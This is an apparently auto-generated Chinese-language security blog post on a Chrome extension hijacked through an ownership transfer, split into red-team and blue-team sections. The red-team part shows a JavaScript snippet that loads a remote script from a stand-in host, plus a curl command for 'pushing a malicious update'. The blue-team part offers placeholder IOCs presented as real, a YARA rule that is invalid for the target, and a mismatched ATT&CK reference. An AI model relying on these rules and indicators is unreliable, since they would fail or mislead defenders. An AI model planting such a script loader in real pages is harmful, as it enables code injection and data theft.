---
layout: post
title:  "Chrome Extension Turns Malicious After Ownership Transfer, Enabling Code Injection and Data Theft"
date:   2026-03-09 12:44:23 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Google Chrome 擴充功能惡意化利用與防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: 遠端代碼執行 (RCE) 與敏感資料竊取
> * **關鍵技術**: 擴充功能惡意化、JavaScript 代碼注入、ClickFix 式攻擊

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Google Chrome 擴充功能的所有權轉移導致惡意代碼注入，主要是因為擴充功能的開發者帳戶被攻擊者接管，從而推送惡意更新。
* **攻擊流程圖解**: 
  1. 攻擊者接管擴充功能開發者帳戶。
  2. 推送惡意更新到擴充功能中。
  3. 使用者安裝或更新擴充功能。
  4. 惡意代碼被執行，竊取使用者敏感資料。
* **受影響元件**: Google Chrome 擴充功能，特別是那些已經被攻擊者接管的擴充功能。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要接管擴充功能開發者帳戶，並推送惡意更新。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 範例惡意代碼
    function injectMaliciousCode() {
      // 注入惡意代碼
      var maliciousCode = "https://example.com/malicious.js";
      var script = document.createElement("script");
      script.src = maliciousCode;
      document.body.appendChild(script);
    }
    
    ```
  * **範例指令**: 使用 `curl` 推送惡意更新到擴充功能中。

```

bash
curl -X POST \
  https://example.com/extension/update \
  -H 'Content-Type: application/json' \
  -d '{"update": "malicious_update"}'

```
* **繞過技術**: 攻擊者可以使用 ClickFix 式攻擊，讓使用者點擊假的更新提示，從而執行惡意代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /malicious.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_extension {
      meta:
        description = "Detects malicious Chrome extension"
      strings:
        $malicious_code = "https://example.com/malicious.js"
      condition:
        $malicious_code in (pe.data or pe.sections)
    }
    
    ```
  * **SIEM 查詢語法** (Splunk/Elastic):

    ```
    
    sql
    index=chrome_extension sourcetype=extension_update 
    
    | search "malicious_update"
    | stats count as num_malicious_updates
    | where num_malicious_updates > 0
    ```
* **緩解措施**: 使用者應該立即移除已經被攻擊者接管的擴充功能，並避免安裝來源不明的擴充功能。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ClickFix 式攻擊**: 一種社交工程攻擊，讓使用者點擊假的更新提示，從而執行惡意代碼。
* **JavaScript 代碼注入**: 一種攻擊技術，將惡意代碼注入到網頁中，從而竊取使用者敏感資料。
* **擴充功能惡意化**: 一種攻擊技術，將擴充功能轉變為惡意軟體，從而竊取使用者敏感資料。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/chrome-extension-turns-malicious-after.html)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


